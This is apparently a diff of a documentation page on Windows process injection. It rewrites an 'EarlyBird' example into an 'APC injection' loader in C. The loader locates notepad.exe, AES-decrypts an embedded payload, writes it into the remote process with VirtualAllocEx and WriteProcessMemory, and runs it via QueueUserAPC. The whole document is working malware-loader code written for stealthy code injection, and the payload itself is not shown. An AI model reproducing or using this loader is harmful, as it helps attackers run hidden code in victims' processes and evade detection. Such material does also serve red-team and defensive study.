@@ -1,13 +1,12 @@
-# EarlyBird
+# Async Procedure Call Injection
 
-```c
-#include <winternl.h>
-#include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <tlhelp32.h>
-#include <wincrypt.h>
+<pre class="language-c"><code class="lang-c"><strong>#include &#x3C;winternl.h>
+</strong>#include &#x3C;windows.h>
+#include &#x3C;stdio.h>
+#include &#x3C;stdlib.h>
+#include &#x3C;string.h>
+#include &#x3C;tlhelp32.h>
+#include &#x3C;wincrypt.h>
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "advapi32")
 
@@ -112,20 +111,20 @@ int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen
 	HCRYPTHASH hHash;
 	HCRYPTKEY hKey;
 
-	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+	if (!CryptAcquireContextW(&#x26;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
 		return -1;
 	}
-	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &#x26;hHash)) {
 		return -1;
 	}
 	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
 		return -1;
 	}
-	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
+	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &#x26;hKey)) {
 		return -1;
 	}
 
-	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
+	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&#x26;payload_len)) {
 		return -1;
 	}
 
@@ -156,12 +155,12 @@ int FindTarget(const wchar_t* procname) {
 
 	pe32.dwSize = sizeof(PROCESSENTRY32);
 
-	if (!Process32First(hProcSnap, &pe32)) {
+	if (!Process32First(hProcSnap, &#x26;pe32)) {
 		CloseHandle(hProcSnap);
 		return 0;
 	}
 
-	while (Process32Next(hProcSnap, &pe32)) {
+	while (Process32Next(hProcSnap, &#x26;pe32)) {
 		wcsncpy_s(exeNameLower, 260, pe32.szExeFile, _TRUNCATE);
 		for (size_t i = 0; exeNameLower[i]; i++) {
 			exeNameLower[i] = towlower(exeNameLower[i]);
@@ -187,7 +186,7 @@ HANDLE FindThread(int pid) {
 	thEntry.dwSize = sizeof(thEntry);
 	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 
-	while (Thread32Next(Snap, &thEntry)) {
+	while (Thread32Next(Snap, &#x26;thEntry)) {
 		if (thEntry.th32OwnerProcessID == pid) {
 			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
 			break;
@@ -199,36 +198,55 @@ HANDLE FindThread(int pid) {
 }
 
 
-// EarlyBird injection
+// APC injection
+int InjectAPC(int pid, HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
+
+	HANDLE hThread = NULL;
+	LPVOID pRemoteCode = NULL;
+	CONTEXT ctx;
+
+	// find a thread in target process
+	hThread = FindThread(pid);
+	if (hThread == NULL) {
+		printf("Error, hijack unsuccessful.\n");
+		return -1;
+	}
+
+	// Decrypt and inject payload
+	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
+
+	// perform payload injection
+	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
+
+	// execute the payload by adding async procedure call (APC) object to thread's APC queue
+	QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
+
+	return 0;
+}
+
+
 int main(void) {
 
 	int pid = 0;
 	HANDLE hProc = NULL;
 
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	void* pRemoteCode;
+	pid = FindTarget(L"notepad.exe");
 
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
+	if (pid) {
+		printf("Notepad.exe PID = %d\n", pid);
 
-	CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA) & si, &pi);
+		// try to open target process
+		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+			FALSE, (DWORD)pid);
 
-	// Decrypt and inject payload
-	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
-
-	// Allocate memory for payload and throw it in
-	pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-	WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
-
-	QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
-
-	//printf("pload = %p ; remcode = %p\nReady to roll!\n", payload, pRemoteCode);
-	//getchar();
-	ResumeThread(pi.hThread);
-
+		if (hProc != NULL) {
+			InjectAPC(pid, hProc, payload, payload_len);
+			CloseHandle(hProc);
+		}
+	}
 	return 0;
 }
-```
 
+</code></pre>
